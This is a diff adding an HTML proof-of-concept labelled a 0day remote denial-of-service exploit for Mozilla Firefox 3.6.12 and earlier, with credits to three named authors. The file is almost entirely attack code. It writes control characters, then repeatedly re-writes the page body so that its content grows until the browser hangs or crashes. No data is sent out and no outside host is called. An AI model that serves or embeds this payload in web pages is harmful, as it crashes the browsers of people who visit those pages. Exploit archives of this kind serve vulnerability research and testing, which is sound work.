@@ -1,0 +1,25 @@
+<!--
+
+	0day Mozilla Firefox <= 3.6.12 Remote Denial Of Service
+
+	Credits:
+	Emanuele 'emgent' Gentili	<emgent@backtrack-linux.org>
+	Marco 'white_sheep' Rondini	<white_sheep@backtrack-linux.org>
+	Alessandro 'scox' Scoscia	<scox@backtrack.it>
+
+-->
+
+<script>document.write("\u0000\u0001\u0002\u0003\u0004\u0005")</script>
+<script>
+var i=0;
+for (i=0;i<=19999;i++)
+{
+	document.write("a");
+}
+
+for (i=0;i<=3;i++)
+{
+	document.write(document.body.innerHTML);
+}
+
+</script>
